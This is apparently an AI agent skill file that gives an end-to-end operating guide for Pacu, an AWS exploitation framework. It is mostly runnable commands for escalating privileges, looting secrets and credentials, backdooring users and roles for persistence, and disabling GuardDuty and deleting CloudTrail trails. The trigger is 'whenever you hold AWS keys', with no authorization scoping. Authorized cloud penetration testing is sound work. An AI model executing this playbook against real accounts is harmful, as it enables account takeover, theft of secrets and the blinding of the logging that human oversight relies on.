---
name: pacu
description: Operate Pacu (Rhino Security Labs' AWS exploitation framework) end to end — session management, credential import/swap, IAM/service enumeration, iam__privesc_scan detection AND exploitation, persistence, loot download, and detection-evasion modules; use whenever you hold AWS keys and need to enumerate what they can do and execute escalation.
license: Apache-2.0
metadata:
  author: Section9Labs
  domain: cloud
---

# Pacu — AWS exploitation framework

Pacu is the AWS attack framework that both **enumerates and executes**: it maps
what a credential can do, detects ~30 privilege-escalation methods, exploits
them, backdoors principals for persistence, and downloads loot. Pair it with
`pmapper` (which maps the IAM graph offline) and `cloud-privilege-escalation`
(the raw CLI per method). Install: `pip install pacu` (or clone
RhinoSecurityLabs/pacu and `pip install .`). Full module catalog:
**references/modules.md**.

## 1. Sessions and credentials

Pacu stores everything per *session* in a local SQLite DB
(`~/.local/share/pacu/sqlite.db`; session loot under
`~/.local/share/pacu/<session>/downloads/`). One session per target
account/engagement; all enumerated data persists and later modules reuse it.

```
pacu                                  # interactive; prompts to create/select a session
Pacu (s1:None) > import_keys target   # import AWS CLI profile "target" as a key set
Pacu (s1:None) > import_keys --all    # import every profile from ~/.aws/credentials
Pacu (s1:None) > set_keys             # paste key id / secret / session token manually
Pacu (s1:imported-target) > swap_keys # switch between stored key sets (menu)
Pacu > whoami                         # current identity + confirmed permissions so far
```

Every credential you capture mid-op (privesc output, instance metadata, Lambda
env vars, SSM parameters) goes back in via `set_keys` under a new key alias,
then `swap_keys` — **the credential loop**: new key -> enumerate -> escalate ->
loot -> new key.

Non-interactive (automation / rupu dispatch):

```
pacu --session s1 --module-name iam__enum_permissions --exec
pacu --session s1 --module-name iam__privesc_scan --exec --module-args "--scan-only"
pacu --session s1 --module-name ec2__enum --exec --module-args "--regions us-east-1,eu-west-1"
pacu --list-modules
pacu --session s1 --whoami
pacu --session s1 --data IAM
```

## 2. Core console commands

```
ls | search <term> | search cat ESCALATE     # find modules (categories: RECON_UNAUTH, ENUM, ESCALATE, LATERAL_MOVE, EXPLOIT, PERSIST, EXFIL, EVADE)
help <module>                                # full module doc + required permissions + args
run <module> [--module-args...]              # execute (alias: exec)
run ec2__enum --regions us-east-1,us-west-2  # most service modules take --regions
set_regions us-east-1 eu-west-1              # default region set for the session
regions                                      # list valid regions
data                                         # everything gathered this session
data IAM | data EC2 | data Lambda | data S3  # per-service gathered data (JSON)
services                                     # which services have data
console                                      # open AWS web console via federation (sessionless keys)
exit / quit
```

## 3. The standard chain

```
run iam__enum_users_roles_policies_groups          # account-wide IAM inventory (needs iam list perms)
run iam__enum_permissions                          # CONFIRMED permissions of the CURRENT principal
run iam__bruteforce_permissions                    # when iam:List*/Get* is denied: brute-check API calls
                                                   #   (noisy; thousands of calls; fills in confirmed perms)
run iam__privesc_scan                              # detect ~30 privesc methods from confirmed perms
run iam__privesc_scan --scan-only                  # detect but don't offer exploitation
run iam__privesc_scan --offline                    # scan ALL principals from enum data, not just self
```

`iam__privesc_scan` output per method is **CONFIRMED** (every required
permission proven) or **POTENTIAL** (some permissions unknown/conditional).
Interactively it offers to exploit confirmed methods on the spot; it prompts
for specifics (target user, role ARN to pass, payload). Drive it
non-interactively per method, e.g.:

```
run iam__privesc_scan --method CreateAccessKey --user-name admin-alice
run iam__privesc_scan --method PutUserPolicy
run iam__privesc_scan --method PassExistingRoleToNewLambdaThenInvoke --role-arn arn:aws:iam::198765432100:role/lambda-admin
```

Method names, required perms, and exact exploitation flow for all ~30 methods:
**references/modules.md** and the `cloud-privilege-escalation` skill. Treat
POTENTIAL as "try it": run the method; AccessDenied costs nothing but a log line.

## 4. Enumeration and loot

```
run ec2__enum --regions us-east-1                  # instances, SGs, EIPs, volumes, snapshots
run ec2__download_userdata                         # user-data of every enumerated instance/launch template — creds goldmine
run lambda__enum --regions us-east-1               # functions + ENV VARS (creds) + download code
run s3__download_bucket --names corp-data          # or run bare to pick from enumerated buckets
run secrets__enum                                  # Secrets Manager secret values
run systemsmanager__download_parameters            # all SSM Parameter Store values incl. SecureString
run enum__secrets                                  # grep everything already downloaded for keys/tokens
run rds__enum ; run eks__enum ; run ecs__enum ; run route53__enum ; run glue__enum
```

Everything lands in `data <SERVICE>` and `~/.local/share/pacu/<session>/downloads/`.
Grep downloads for `AKIA`, `aws_secret`, `BEGIN RSA`, `password`.

## 5. Persistence, lateral movement, evasion

```
run iam__backdoor_users_keys                       # second access key on target users
run iam__backdoor_users_password                   # console password via Create/UpdateLoginProfile
run iam__backdoor_assume_role --role-names prod-admin --user-arns arn:aws:iam::203000113000:user/ours
                                                   # append our principal to a role's trust policy
run lambda__backdoor_new_users / lambda__backdoor_new_roles / lambda__backdoor_new_sec_groups
                                                   # IAM-event-triggered Lambda backdoors
run detection__enum_services                       # GuardDuty, CloudTrail, Config, Shield posture
run cloudtrail__download_event_history --regions us-east-1
run detection__disruption                          # disable/minimize GuardDuty detectors, delete/stop trails (loud but blinding)
run elastic_ip_hijack? -> see references/modules.md for the full EVADE/PERSIST list
```

Run `detection__enum_services` **early** — know whether GuardDuty/CloudTrail
will see the rest of your run and plan module order accordingly.

## 6. Reading output & the credential loop

- `[+]` lines = success/confirmed; `[-]`/AccessDenied = move on; summary block
  at module end tells you what was stored (`data <service>` to inspect).
- Any output containing new `AKIA*`/`ASIA*` keys, role session creds, or
  passwords: `set_keys` -> `swap_keys` -> rerun `iam__enum_permissions` +
  `iam__privesc_scan` as the new principal. Repeat until admin or exhausted.
- After each escalation, rebuild the pmapper graph (`pmapper graph create`) —
  the map changed.

## 7. Parse into work units

```
python3 scripts/parse_pacu.py --db ~/.local/share/pacu/sqlite.db --session s1 \
    -o out/work-units.json --assets out/assets.json
python3 scripts/parse_pacu.py --privesc-log out/privesc_scan.txt -o out/work-units.json
```

Parses the session SQLite DB (stdlib `sqlite3`) and/or a captured
`iam__privesc_scan` log, emitting a bare JSON array: one unit per CONFIRMED
privesc method and one per loot target (instance with user-data, Lambda with
env vars, bucket, secret, parameter). POTENTIAL methods are included with
`hints.confidence: "potential"`. Hand units to `cloud-privilege-escalation`
for exact exploit CLI; record assets/findings per **references/rupu.md**.
Umbrella: `cloud-security`; map first with `pmapper`; feed new creds to
`cloud-credential-enumeration`.
